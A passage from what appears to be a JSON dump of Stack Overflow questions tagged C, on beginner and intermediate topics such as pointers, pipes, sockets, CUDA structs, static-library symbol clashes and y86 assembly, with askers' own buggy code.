Enqueue(FrontAndDequeue(multiLevelArray[2]),multiLevelArray[1]);\n      }\n    }\n     sem_post(&amp;mysem);\n }\n}\n\nint main(int argc, char** argv) {\n  //set the max cpu queue. This will also be the length for the P0 queue.\n  max_cpu_queue = *argv[1]- '0';\n   if ( sem_init(&amp;mysem,0,1) ) {\n    perror(\"init\");\n  }\n  pthread_t *servicingThread;\n  pthread_t *requestThreads;\n  param *p;\n\n  p=(param *)malloc(sizeof(param)*2);\n  requestThreads=(pthread_t *)malloc(5*sizeof(*requestThreads)); //allocate mem for 2 threads\n\n  //allocate memory for the serving Thread\n  servicingThread=(pthread_t *)malloc(sizeof(*servicingThread));\n\n  Queue pZero;\n  Queue pOne;\n  Queue pTwo;\n  int i;\n\n  pZero=CreateQueue(max_cpu_queue);\n  pOne=CreateQueue(30);\n  pTwo=CreateQueue(30);\n\n  //we are going to add in the queues to the multiLevelArray \n  multiLevelArray[0]=pZero;\n  multiLevelArray[1]=pOne;\n  multiLevelArray[2]=pTwo;\n\n  p[0].start=1;\n  p[0].end=10;\n  pthread_create(&amp;requestThreads[0],NULL,startRequestThread,(void *)(p));\n\n  p[1].start=11;\n  p[1].end=20;\n  pthread_create(&amp;requestThreads[1],NULL,startRequestThread,(void *)(p+1));\n\n  p[2].start=4;\n  p[2].end=5;\n  pthread_create(&amp;requestThreads[2],NULL,startRequestThread,(void *)(p+2));\n\n  p[3].start=8;\n  p[3].end=5;\n  pthread_create(&amp;requestThreads[3],NULL,startRequestThread,(void *)(p+3));\n\n  p[4].start=90;\n  p[4].end=2;\n  pthread_create(&amp;requestThreads[4],NULL,startRequestThread,(void *)(p+4));\n\n  // pthread_create(&amp;servicingThread,NULL,startServicingThread,NULL);\n\n  //wait for the servicing thread to finish before termination\n  pthread_join(servicingThread,NULL);\n  // return 0;\n\n}\n</code></pre>\n"},{"tags":["c"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":13219054,"title":"Reading string over args","body":"<p><strong>Hi,</strong></p>\n\n<p>I am trying to read a string into my code via the args[]-parameter, like I would do in Java.\nSo basically, this is what I want to do:</p>\n\n<pre><code> - read the String \"machine\" over launch-parameter\n - go through every letter of that string in a loop\n - while in the loop, check is current letter equals \"e\"\n - if letter equals \"e\", replace it with \"a\"\n - return edited string\n</code></pre>\n\n<p>This is the best way to phrase my elemental questions to C. So I'd be happy if you won't take this post offensive.</p>\n\n<p>How could I implement that code?</p>\n"},{"tags":["c","linux","recursion"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":111,"score":0,"question_id":13006045,"title":"Implementing ls -R command in linux","body":"<p>I want to know how <code>ls -R</code> implemented in C language.\nIs it use the  recursion algorithm?</p>\n"},{"tags":["c"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":44,"score":-1,"question_id":13261753,"title":"how does the computer compare the hexadecimal and decimal values","body":"<p>I was looking through an existing code in C wherein there is a check for no's in a particular range 100 to 899. I wanted to add one more condition along with that the no can have the value 1FE. I should not convert it to a decimal no. But I need to check for this hexadecimal value.\n    My doubt here is, How will the hardware interpret the comparision of the decimal and the hexadecimal. The hardware will interpret the values in zero's and one's. So will it convert the decimal and hexadecimal no's to binary to check the value ? (As 1FE when converted to decimal is 510 which will be included within the no 899).Please help to understand.</p>\n"},{"tags":["c","pointers","parameter-passing","notation","pure"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13261712,"title":"I can't seem to figure out how to properly pass parameters with pure pointer notation","body":"<p>I'm trying to modify a previous program I wrote using pure pointer notation. It's a program that generates a random string of 40 uppercase letter, takes input of up to 20 uppercase letter, and input of a character. The program replaces reoccurring characters in the generated string with the character entered. Right now, I'm trying to pass the parameters of the randomly generated string so I can access them in the second function and can't figure out how to do it. </p>\n\n<p>Thank you for the help. </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n/* Function prototypes */\nvoid fillS1(char * x);\n\nvoid fillS2(char * x, char * y, char z);\n\nvoid strFilter(char * a, char * b, char c);\n\nint main(int argc, const char * argv[])\n{\n\nchar s1[41];\nchar s2[21];\nchar x = 0;\n\nchar * pointerToS1;\nchar * pointerToS2;\n\npointerToS1 = s1;\npointerToS2 = s2;\n\nfillS2(pointerToS2, pointerToS1, x);\n\nreturn 0;\n}\n\n/* Function to generate a random string of 40 uppercase letters */\nvoid fillS1(char * randomlyGeneratedPointer)\n{\nchar randomlyGeneratedArray[41];\n\nrandomlyGeneratedPointer = randomlyGeneratedArray;\n\nint i;\n\nfor (i = 0; i &lt; 40; i++) {\n    *(randomlyGeneratedPointer + i) = 'A' + rand() % 26;\n}\n\n\n}\n\n/* Function to get user input of characters */\nvoid fillS2(char * userStringPointer, char * randomStringPointer, char     replacementCharacter)\n{\n\nchar userstring[21];\nchar randomString[41];\nchar copyString[42];\n//char * pointerToCopyString = copyString;\n\nuserStringPointer = userstring;\n\n\n\nint i = 0;\nint n = 0;\nint lowercaseCheck = 0;\n\nchar loopContinue = 0;\n\n\n\n\nfillS1(randomStringPointer);  //here is the function call for the randomly generated       string.\n\n\n\nprintf(\"This is the random string: %s\", randomStringPointer);\n\ndo {\n\n    /* For loop to copy the first randomly generated string */\n    for(i = 0; i &lt; 42; i++)\n        *(randomStringPointer + i) = copyString[i];\n\n    randomStringPointer = copyString;\n\n    i = 0;\n    lowercaseCheck = 0;\n\n    /* While loop to to get user input */\n    printf(\"Please enter at least 2 capital letters and a maximum of 20.\\n\");\n    while  ((((*(userStringPointer + i)) = getchar()) != '\\n'))  {\n\n        /* Counter to determine how many characters were entered */\n        i++;\n\n    }\n\n    /* Adding 1 to add to add null character */\n    i++;\n\n    *(userStringPointer + i) = '\\0';\n\n    //printf(\"This is the user's string %s\", userStringPointer);\n\n    /* Capital letter check */\n    for (n = 0; n &lt; 20; n++) {\n        if (((*(userStringPointer + n)) &gt;= 'a') &amp;&amp; (*(userStringPointer + n) &lt;= 'z')) {\n\n            lowercaseCheck++;\n        }\n    }\n\n    if (--i &lt; 3) {\n        printf(\"You need at least two letters\\n\");\n    }\n\n    else if (i &gt; 21){\n        printf(\"You cannot have more than twenty letters\\n\");\n    }\n\n    else if (lowercaseCheck == 0) {\n\n        puts(userStringPointer);\n\n        printf(\"Enter a character to replace occuring letters.\\n\");\n        scanf(\"%c\", &amp;replacementCharacter);\n        getchar();\n\n        //printf(\"this is the copy string before strFilter: %s\", randomStringPointer);\n        //printf(\"This is the replacement character %c\", replacementCharacter);\n\n        strFilter(randomStringPointer, userStringPointer, replacementCharacter);\n\n    }\n\n    else\n\n        printf(\"You  must have 2 capital letters.\\n\");\n\n\n    printf(\"Would you like to enter another string (y/n)?\\n\");\n    loopContinue = getchar();\n    getchar();\n\n\n} while (loopContinue != 'n' &amp;&amp; loopContinue != 'N');\n\n}\n\n/* Function to replace letters with the character chosen by the user */\nvoid strFilter(char * replacementCopyStringPointer, char * replacementUserStringPointer,         char c)\n{\n\nint i = 0;\nint n = 0;\n\nwhile (n &lt; 20) {\n\n    for (i = 0; i &lt; 40; i++) {\n        if ((*(replacementCopyStringPointer + i)) == *(replacementUserStringPointer + n)){\n            *(replacementCopyStringPointer + i) = c;\n        }\n    }\n    i = 0;\n    n++;\n}\n\nputs(replacementCopyStringPointer);\n}\n</code></pre>\n"},{"tags":["c","sockets","network-programming","freebsd"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":47,"score":2,"question_id":13261004,"title":"SOCK_STREAM socket listen() causing TCP syn/ack to be sent","body":"<p>I have a socket set up  to accept TCP connections with</p>\n\n<pre><code>socket(AF_INET, SOCK_STREAM, 0)\n</code></pre>\n\n<p>and I am then calling <code>bind()</code>, <code>listen()</code> and <code>accept()</code></p>\n\n<p>The problem is that when I call listen(), it is causing a SYN/ACK packet to be sent to the client. I thought that would not happen until I called accept(), but what's worse is that the SYN/ACK packet doesnt have the acknowledgement increased by one.</p>\n\n<p>What is causing this, and how can I fix it?</p>\n\n<p>Thanks</p>\n\n<p>As a side note - does it matter that my TCP connection is asymmetric?</p>\n"},{"tags":["java","c","object","methods","jni"],"answer_count":4,"favorite_count":1,"up_vote_count":9,"down_vote_count":0,"view_count":5596,"score":9,"question_id":1010645,"title":"What does the registerNatives() method do?","body":"<p>In java, what does the private static method <code>registerNatives()</code> of the Object class do?</p>\n"},{"tags":["c","cuda","nvidia","memcheck","cuda-gdb"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":183,"score":3,"question_id":12060728,"title":"Nvidia CUDA - passing struct by pointer","body":"<p>I have a problem with passing a pointer to the struct to the device function.\nI want to create a struct in local memory (i know it's slow, it's just an example) and pass it to the other function by pointer. The problem is that when i debug it with memcheck on, i get error:</p>\n\n<p><code>Program received signal CUDA_EXCEPTION_1, Lane Illegal Address.\nSwitching focus to CUDA kernel 0, grid 1, block (0,0,0), thread (0,0,0), device 0, sm 7, warp 0, lane 0\n0x0000000000977608 in foo (st=0x3fffc38) at test.cu:15\n15 st-&gt;m_tx = 99;</code></p>\n\n<p>If I debug it without memcheck on, it works fine and gives expected results.\nMy OS is RedHat 6.3 64-bits with Kernel 2.6.32-220.\nI use GTX680, CUDA 5.0 and compile the program with sm=30.</p>\n\n<p>Code I used for testing this is below:</p>\n\n<pre><code>typedef struct __align__(8) {\n    int m_x0;\n    int m_tx;\n} myStruct;\n\n__device__ void foo(myStruct *st) {\n    st-&gt;m_tx = 99;\n    st-&gt;m_x0 = 123;\n}\n__global__ void myKernel(){\n    myStruct m_struct ;\n    m_struct.m_tx = 45;\n    m_struct.m_x0 = 90;\n    foo(&amp;m_struct);\n}\nint main(void) {\n    myKernel  &lt;&lt;&lt;1,1 &gt;&gt;&gt;();\n    cudaThreadSynchronize();\n    return 0;\n}\n</code></pre>\n\n<p>Any suggestions? Thanks for any help.</p>\n"},{"tags":["c","exec","fork","pipe"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":69,"score":1,"question_id":13242506,"title":"create pipe after fork() and exec()","body":"<p>consider the following:</p>\n\n<ol>\n<li>a parent process with a child</li>\n<li>child runs another program using exec system call </li>\n<li>parent and child communicating through a bi-directional pipe(named MAINPIPE in rest)</li>\n<li>the child is a server binding on a port(e.g. 5000)</li>\n</ol>\n\n<p>my program should work as follows:</p>\n\n<p>if child receives a certain message from a client create another bi-directional pipe to his parent and send/receive some info.</p>\n\n<p>the problem is:</p>\n\n<p>when I create a pipe in the child (using <code>pipe()</code>) and pass the file descriptors to the parent (using MAINPIPE), parent gets \"Bad file descriptor\" error message when trying to read from pipe.</p>\n\n<p>any idea?</p>\n\n<p>EDIT:</p>\n\n<p>guys,</p>\n\n<p>my problem isn't passing file-desciptors of new pipe -that is created in child process- to parent,\ni've already done that using MAINPIPE,</p>\n\n<p>but problem is : parent can't read from new pipe, got this error message \"bad file descriptor\"\nit seems that the file descriptors is closed in parent process!</p>\n"},{"tags":["c","eclipse","typedef","redefinition","codewarrior"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13260122,"title":"How to Project Against Symbol Redefinition","body":"<p>My project incorporates a stack, which has a number of user-defined types (<code>typedef</code>).  The problem is that many of these type definitions conflict with our in-house type definitions.  That is, the same symbol name is being used.  Is there any way to protect against this?</p>\n\n<p>The root of the problem is that to use the stack in our application, or wrapper code, as the case may be, a certain header file must be included.  This stack header file in turn includes the stack provider's types definition file.  That's the problem.  They should have included their type definition file via a non-public include path, but they didn't.  Now, there are all sorts of user-defined type conflicts for very common names, such as <code>BYTE</code>, <code>WORD</code>, <code>DWORD</code>, and so forth.</p>\n"},{"tags":["c"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":38,"score":0,"question_id":13259753,"title":"Getting the execution time of a child process","body":"<p>I am working on a mini-\"shell\" project and I'm looking for the execution time of a child process. I wanted to use times(2), <a href=\"http://linux.die.net/man/2/times\" rel=\"nofollow\">http://linux.die.net/man/2/times</a> . However this returns the time of all children. However it also states that it adds the time of a waited for terminated child. Here is my question, does this mean it alters the time values when the child terminates if it already was waited for or does it change the time values only when its waited for after its terminated and its \"zombie\" process is removed?</p>\n\n<p>I am going to try both and see if it works now but I was just wondering if anyone had any idea. Also the professor mentioned getitimer(2) but I have no idea how it works.</p>\n"},{"tags":["c","operating-system"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":72,"score":4,"question_id":13246210,"title":"What Happens when main() function does not return zero","body":"<p>Please consider the following Code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    int x;\n    printf (\"\\nEnter x: \");\n    scanf (\"%d\", &amp;x);\n\n    return x;\n}\n\nOutput:\n$Enter x: -2\n\n$echo $?\n254\n</code></pre>\n\n<p>My Question is:</p>\n\n<p>The OS knows that return value of main() by executing a process P (The above code under execution) is NON-ZERO.</p>\n\n<p>Does the OS does any kind of Handling in such cases?</p>\n"},{"tags":["c","mpi","mkstemp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13166972,"title":"MPI-aware mkstemp(3) for use with MPI_FILE_OPEN?","body":"<p>I'd like to generate a unique filename within an MPI application.</p>\n\n<p>Reading \"Advice to implementors\" under <code>MPI_FILE_OPEN</code> in version 2.2 of the the specification indicates that filenames like <code>uriPrefix:foo/bar/baz</code> in addition to just the usual <code>foo/bar/baz</code> are possible.  As are filenames like <code>baz/PASSWORD=SECRET</code>.  The MPI implementation is expected to do the right thing with this additional information.</p>\n\n<p>These additional filename elements will play havoc with <code>mkstemp(3)</code>.  In the former case, the <code>uriPrefix</code> may indicate where the file should be housed.  In the later case, <code>bazXXXXXX/PASSWORD=SECRET</code> will screw up <code>mkstemp(3)</code>'s template conventions.</p>\n\n<p>Does anyone have suggestions for how to safely combine <code>mkstemp(3)</code> with <code>MPI_FILE_OPEN</code>?</p>\n"},{"tags":["c","imagemagick"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":13219710,"title":"taking a screenshot using imagemagick API","body":"<pre><code>gcc 4.7.2\nc89\nImageMagick-6.8.0-4\n</code></pre>\n\n<p>Hello,</p>\n\n<p>I am trying to take a screen shot using the imagemagick API. I have downloaded, compiled and installed the headers and libraries.</p>\n\n<p>However, I can't see in the documentation the api calls to do the screen shot. I will be linking and including the headers so that I can call the api from my c program. I just want the name of the function I will have to use to do this.</p>\n\n<p>Can anyone point me in the right direction? Can imagemagick take screenshots?</p>\n\n<p>Many thanks in advanced,</p>\n"},{"tags":["c","arrays"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":54,"score":-1,"question_id":13260345,"title":"Why won't all of my char array get passed (in C)?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/5493281/c-sizeof-a-passed-array\">C sizeof a passed array</a><br>\n  <a href=\"http://stackoverflow.com/questions/11622146/why-sizeofparam-array-is-the-size-of-pointer\">Why sizeof(param_array) is the size of pointer?</a>  </p>\n</blockquote>\n\n\n\n<p>I'm new to C, and am a little confused by the type system. I'm trying to write some code to print the number of lower case characters in a string, but only an int-sized piece of my array gets passed to the cntlower function. Why is this?</p>\n\n<pre><code>#include \"lecture2.h\"\n\nint main(void){\n    int lowerAns;\n    char toCount[] = \"sdipjsdfzmzp\";\n    printf(\"toCount size %i\\n\", sizeof(toCount));\n    lowerAns = cntlower(toCount);\n    printf(\"answer %i\\n\", lowerAns);\n}\n\nint cntlower(char str[]) {\n\n    int lowers = 0;\n    int i = 0;\n    printf(\"str size %i\\n\", sizeof(str));\n    printf(\"char size %i\\n\", sizeof(char));\n\n    for(i = 0; i &lt; (sizeof(str)/sizeof(char)); i++) {\n         if(str[i] &gt;= 'a' &amp;&amp; str[i] &lt;= 'z') {\n               lowers++;\n         }\n    }\n\n    return lowers;\n\n}\n</code></pre>\n\n<p>As it is, the output is currently:\n    toCount size 13\n    str size 4\n    char size 1\n    answer 4</p>\n\n<p>I'm sure the reason for this is obvious for some of you, but unfortunately it isn't for me!</p>\n"},{"tags":["c++","c","linker","openssl","static-libraries"],"answer_count":2,"favorite_count":1,"up_vote_count":19,"down_vote_count":0,"view_count":193,"score":19,"question_id":13199870,"title":"How can I link with (or work around) two third-party static libraries that define the same symbols?","body":"<p>I can't be the only one to run into this.</p>\n\n<p>I have a C++ application that needs to link with one third-party and another static library set in an SDK.  The SDK has, for some hideously frustrating reason, recompiled a subset of that same third-party library into their own (renamed) lib, although the symbols themselves are named the same and they are not encapsulated within a namespace.  My application itself depends upon the same third-party library.</p>\n\n<p>I've considered a few options, but maybe I'm missing something and hopefully a fresh look will help me out.  Perhaps I'm close and someone will know the next step for one of these . I'll enumerate what I've tried and the shortcomings of each solution so far:</p>\n\n<ol>\n<li><p>Link with both.\nI get about 2500 lines of symbol redefinition / size change warnings and errors.  This is when I first found that they defined the same symbols.  I'm trying to recompile OpenSSL with g++ and drop it into a namespace at the moment...see edit below...</p></li>\n<li><p>Link with the SDK only.\nI get undefined symbols that my own code depends upon - this is when I found that their recompile of the third party lib is a subset, or at least was configured with one module disabled.</p></li>\n<li><p>Link with the third party lib only.\nI have a couple of undefined symbols reported by the SDK - one of them is actually a #define in a header file within the third party lib, so all references in the third party lib resolve to the definition, but references outside there do not.  I moved that into the c file, which resolves that, however I still have two unresolved functions I can't find anywhere.  This is the closest I've gotten so far.</p></li>\n<li><p>Strip conflicting symbols from one lib and link in both.\nSo far this hasn't worked.  It could be a version issue between the lib statically linked in the SDK and the versions I've tried using of the third-party lib, but it looks like some functions were moved between symbols, so by removing a symbol, I inadvertently remove a function that I need elsewhere.  There doesn't seem to be a perfect mapping between functions in symbols in the SDK vs functions in symbols in the third-party lib.  Is it plausible to strip functions without having to manually adjust addresses?</p></li>\n</ol>\n\n<p>I've been examining symbols in libs with:</p>\n\n<pre><code>nm -C --defined-only lib&lt;name&gt;.a\n</code></pre>\n\n<p>And extracting entire objects with:</p>\n\n<pre><code>ar -x lib&lt;name&gt;.a &lt;objname&gt;.o\n</code></pre>\n\n<p>Hopefully this will also help others who have had to link with third-party libs that conflict with one another.  For the sake of specifics, the third-party lib is <a href=\"http://www.openssl.org/\">OpenSSL</a>, and the SDK is <a href=\"http://www.opsec.com/cp_products/opsec_sdk.html\">Opsec</a> - libcpopenssl.a is the offending lib in Opsec.</p>\n\n<p>**EDIT- A late entry possible workaround may be to recompile OpenSSL with g++ and put the whole thing in a namespace, and then link both libs.  I'm trying that now...more to come...</p>\n"},{"tags":["c","arrays","recursion"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":13259667,"title":"Passing Array to a function and Adding it through Recursion","body":"<p>What em trying to do is pass the array to a function which will add all the array elements and return the output. Please help me. i dont know what i am doing wrong in this :/</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#define MAX 5\n\nint arraySum(int *dArr,int lim);\n\nint main()\n{\n    int array[MAX] = {9,7,4,2,10};\n    printf(\"%d\", arraySum(array, MAX));\n    return 0;\n}\nint arraySum(int *dArr,int lim)\n{\n    int Ans;\n    if(lim&gt;0)\n    Ans = dArr[lim] + arraySum(*dArr, lim--);\n    return Ans;\n} \n</code></pre>\n"},{"tags":["c++","c","physics","bullet","bulletphysics"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":168,"score":-1,"question_id":13184328,"title":"How short int based masks work in C++ library Bullet?","body":"<p>How do short int based masks work in c++ (for example <a href=\"http://bulletphysics.com/Bullet/BulletFull/classbtCollisionWorld.html#a3ca1134733136dc68691a8cd73196cc6\" rel=\"nofollow\">ones in Bullet</a>)?</p>\n\n<p>I <a href=\"http://bulletphysics.com/Bullet/BulletFull/structbtBroadphaseProxy.html#pub-types\" rel=\"nofollow\">look at Bullets</a></p>\n\n<pre><code>CollisionFilterGroups { \n  DefaultFilter = 1, \n  StaticFilter = 2, \n  KinematicFilter = 4, \n  DebrisFilter = 8, \n  SensorTrigger = 16, \n  CharacterFilter = 32, \n  AllFilter = -1 \n}\n</code></pre>\n\n<p>And see that all values are degrees of 2 and I <a href=\"http://en.wikipedia.org/wiki/Integer_%28computer_science%29#Short_integer\" rel=\"nofollow\">know that</a>:</p>\n\n<p>short is signed integer that takes 2 bytes to store and is from −32,768 to +32,767.</p>\n\n<p>But how to create my own groups: how to calculate mask intersections?</p>\n\n<p>For example how to create in addition to CollisionFilterGroups something like:</p>\n\n<pre><code>MyCollisionFilterGroups { \n  Cubes= ?,\n  Boxes= ?, \n  Spheres= ?\n}\n</code></pre>\n\n<p>Where </p>\n\n<ul>\n<li>We want \"planes\" not to collide (\"see\") with \"planes\", \"boxes\" and \"spheres\"</li>\n<li>We want \"boxes\" to collide with other \"boxes\" and \"spheres\"</li>\n<li>We want \"spheres\" not to collide with \"spheres\" yet collide with \"boxes\"</li>\n</ul>\n"},{"tags":["c","debugging","gdb","cygwin","backtrace"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":110,"score":1,"question_id":10744381,"title":"How to get a useful backtrace in Cygwin?","body":"<p>Although I have compiled my C program with <code>-g -O0</code>, the backtrace I get from gdb is useless:</p>\n\n<pre><code>(gdb) bt\n#0  0x6113759d in wordfree () from /cygdrive/c/cygwin/bin/cygwin1.dll\n#1  0x75141375 in OutputDebugStringA () from /cygdrive/c/Windows/system32/KERNELBASE.dll\n#2  0x40010006 in ?? ()\n#3  0x00000000 in ?? ()\n</code></pre>\n\n<p>Is there any way to get a useful backtrace in Cygwin?</p>\n\n<p>My gdb version is <code>7.3.50.20111026-cvs (cygwin-special)</code>, gcc is <code>4.5.3</code>.</p>\n"},{"tags":["c","assembly","y86"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":289,"score":2,"question_id":11422895,"title":"Translate C code to assembly code?","body":"<p>I have to translate this C code to assembly code:</p>\n\n<pre><code> #include &lt;stdio.h&gt;\n\n int main(){\n\n int a, b,c;\n scanf(\"%d\",&amp;a);\n scanf(\"%d\",&amp;b);\n if (a == b){\n   b++;\n } \n if (a &gt; b){\n  c = a;\n  a = b;\n  b = c;    \n }\n printf(\"%d\\n\",b-a);\n return 0;\n }  \n</code></pre>\n\n<p>My code is below, and incomplete.</p>\n\n<pre><code>    rdint %eax        # reading a\n    rdint %ebx        # reading b\n    irmovl $1, %edi\n\n    subl %eax,%ebx\n    addl %ebx, %edi\n    je Equal\n\n\n    irmov1 %eax, %efx  #flagged as invalid line\n    irmov1 %ebx, %egx\n    irmov1 %ecx, %ehx\n    irmovl $0, %eax\n    irmovl $0, %ebx\n    irmovl $0, %ecx\n\n    addl %eax, %efx    #flagged as invalid line\n    addl %ebx, %egx\n    addl %ecx, %ehx\n\n\n\n    halt\n</code></pre>\n\n<p>Basically I think it is mostly done, but I have commented next to two lines flagged as invalid when I try to run it, but I'm not sure why they are invalid.  I'm also not sure how to do an if statment for  a > b.  I could use any suggestions from people who know about y86 assembly language.</p>\n"},{"tags":["c","points","rectangles"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":81,"score":0,"question_id":13255569,"title":"How to determine if points lies inside rectangle?","body":"<p>I am working on an assignment where I have to create a program for users to input coordinates for a rectangle.</p>\n\n<p>This program is intended to be a struct within a struct. </p>\n\n<p>If invalid, I have to output an error message and let user try again, indefinitely, until the user gets it right.</p>\n\n<p>The program should repeatedly ask users for coordinates of a point, and the program will quit when user enters 0 and 0 for x and y respectively. </p>\n\n<p>The program has to say whether the point is inside or outside the rectangle, and print out inside ones. I also need to figure out where to put the main function, and what to put in it. \nThanks.</p>\n\n<p>Here is my code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\ntypedef struct\n{\nint x;\nint y;\n} point_t;\n\ntypedef struct\n{\npoint_t upper_left;\npoint_t lower_right;\n} rectangle_t;\n\nint is_inside (point_t* pPoint, rectangle_t* pRect)\n{\nreturn ((pPoint-&gt;x &gt;= pRect-&gt;upper_left.x ) &amp;&amp;\n(pPoint-&gt;x &lt;= pRect-&gt;lower_right.x) &amp;&amp;\n(pPoint-&gt;y &gt;= pRect-&gt;upper_left.y ) &amp;&amp;\n(pPoint-&gt;y &lt;= pRect-&gt;lower_right.y));\n\n}\n\npoint_t get_point(char* prompt)\n{\npoint_t pt;\nprintf(\"Given a rectangle with a side parallel to the x axis and a series of points on          the xy plane this program will say where each point lies in relation to the rectangle. It   considers a point on the boundary of the rectangle to be inside the rectangle\\n\");\nprintf (\"Enter coordinates for the upper left corner\\n\");\nprintf (\"X: \");\nscanf (\"%d\", &amp;pt.x);\nprintf (\"Y: \");\nscanf (\"%d\", &amp;pt.y);\n\nreturn pt;\n}\n\nrectangle_t get_rect(char* prompt)\n{\nrectangle_t rect;\nprintf (prompt);\nrect.upper_left = get_point(\"Upper left corner: \\n\");\nrect.lower_right = get_point(\"Lower right corner: \\n\");\n\nreturn rect;\n}\nint main(){\n/* calls goes here */\nreturn 0;\n}\n</code></pre>\n\n<p>Edit: I added main, but I don't  know how to make calls the functions.</p>\n"},{"tags":["c","struct","fgets"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":13259656,"title":"Using fgets to store a double into a struct","body":"<p>I'm a bit new to C programming and I keep running into this error. Previously I was using fscanf with %lf because age was a double but since I switched to fgets, I do not know how to get it to accept a double. I am attempting to read into a struct. Here's my relevant code:</p>\n\n<blockquote>\n<pre><code>double age;\n...\nwhile(fgets(Employees[i].age, 10, input) != 0)\n</code></pre>\n</blockquote>\n\n<p>gives me this error:</p>\n\n<p>error: incompatible type for argument 1 of fgets\nexpected 'char *' but argument is of type 'double'</p>\n"},{"tags":["c"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":87,"score":1,"question_id":13259897,"title":"Returning values from function","body":"<p>I am very new to c programming. I have written the fallowing code</p>\n\n<pre><code> float value;  //golbal variable\n unsigned int data; //golbal variable\n\n void Maxphase(void) \n { \n  float  MAX = 0.0;\n   unsigned int i,index;\n for (i=0;i&lt;=360;i++) \n {              \n    phaseset(i); \n    data = readvalue(); \n    value = voltage(data);    \n    if(value&gt;MAX)   //find max value \n    { \n      MAX = value;    //max voltage \n      index = i;   \n     }  \n  }                          \n    printf(\"Max Voltage Value:%f\\r\\n\", MAX); \n    printf(\"Related index Value:%d\\r\\n\", index); \n} \n</code></pre>\n\n<p>the above code working perfectly and printing maximum voltage and index. I want return both values \"Max\" and \"index\" from this function and I have to save Max value in one variable and index value in other variable like.</p>\n\n<pre><code>void runCom(void){ \n     c=getchar();\n switch(c){ \n    case '1': \n           Maxphase();\n          Vin= (I want to store MAX value of that function)\n          p1= ( I want to store Index of that function)\n          break; \n    default:\n         break;\n    }\n  }\n</code></pre>\n\n<p>Actually I want call that function and it has to return two variables MAX and index value, thus I want to store those two values in different variables.</p>\n\n<p>I know function can't return two values. </p>\n\n<p>I have searched, i found it is possible with a struct or make the function to handle the arguments with pointers. I tried with struct as shown below.</p>\n\n<pre><code>typedef struct {\n   float v;\n   unsigned int p;\n  }volphase;\n</code></pre>\n\n<p>I have declared this struct in header file. I am including this header file in all files where i am calling.</p>\n\n<pre><code>volphase Maxphase()\n{\n   volphase vp;\nfloat  MAX = 0.0;\n   unsigned int i,index;\n for (i=0;i&lt;=360;i++) \n {              \n    phaseset(i); \n    data = readvalue(); \n    value = voltage(data);    \n    if(value&gt;MAX)   //find max value \n    { \n      MAX = value;    //max voltage \n      index = i;   \n     }  \n  }                          \n   vp.v=MAX;\n   vp.p=index; \n   return vp;\n  } \n</code></pre>\n\n<p>This is written in \"bvr.c\" file.\n But I am thinking how to call this \"struct\" in case'1'(main.c) and how to store vp.v in one variable and vp.p in another variable.</p>\n\n<p>Please suggest me if any thing wrong in writing struct. or any other easiest way that will return two values.</p>\n\n<p>please help me how to do this.</p>\n"},{"tags":["c","assembly","y86"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":239,"score":2,"question_id":10098147,"title":"y86 assembly labels not doing what they should be","body":"<p>posted below is the code I have for a simple y86 assembly program. Given two integers, it should print out the larger of the two. To the right of each line I have an equivalent C translation.</p>\n\n<pre><code># I ask about the need for a first line comment below.\nrdint   %eax          # scanf(\"%d\", &amp;a);\nrdint   %ebx          # scanf(\"%d\", &amp;b);\nrrmovl  %eax, %ecx    # c = a;\nsubl    %ebx, %ecx    # c = a - b;\njge     ALarger       # if (c &gt;= 0) { goto ALarger };\nwrint   %ebx          # printf(\"%d\", b);\njmp     End           # goto End;\n\nALarger:\nwrint   %eax          # printf(\"%d\", a);\n\nEnd:\nirmovl  $10, %ecx     # c = 10;\nhalt\nwrch    %ecx\n</code></pre>\n\n<p>Using the assembler <b>yas</b>, the resulting .yo file looks like this:</p>\n\n<pre><code>0x000: f118         | # I ask about the need for a first line comment below.\n0x002: f208         | rdint   %eax          # scanf(\"%d\", &amp;a);\n0x004: f238         | rdint   %ebx          # scanf(\"%d\", &amp;b);\n0x006: 2001         | rrmovl  %eax, %ecx    # c = a;\n0x008: 6131         | subl    %ebx, %ecx    # c = a - b;\n0x00a: 7514000000   | jge     ALarger       # if (c &gt;= 0) { goto ALarger };\n0x00f: f338         | wrint   %ebx          # printf(\"%d\", b);\n0x011: 7016000000   | jmp     End           # goto End;\n                    |\n0x016:              | ALarger:\n0x016: f308         | wrint   %eax          # printf(\"%d\", a);\n                    |\n0x018:              | 